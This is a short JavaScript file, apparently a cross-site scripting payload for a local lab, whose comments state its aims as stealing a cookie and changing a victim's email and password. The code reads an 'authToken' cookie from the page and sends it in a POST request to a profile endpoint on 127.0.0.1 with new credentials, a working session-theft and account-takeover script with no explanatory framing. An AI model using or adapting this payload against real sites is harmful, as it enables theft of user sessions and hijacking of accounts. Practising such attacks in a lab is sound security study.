// Target
// Steal cookie
// Send POST to change email and password

function getAuthCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i].trim();
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// Example usage:
const token = getAuthCookie("authToken");
console.log(token);

fetch("http://127.0.0.1:5000/profile", {
  method: "POST",
  body: JSON.stringify({
    email: "ABC.com",
    password: "",
    auth: token
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8",
  },
});
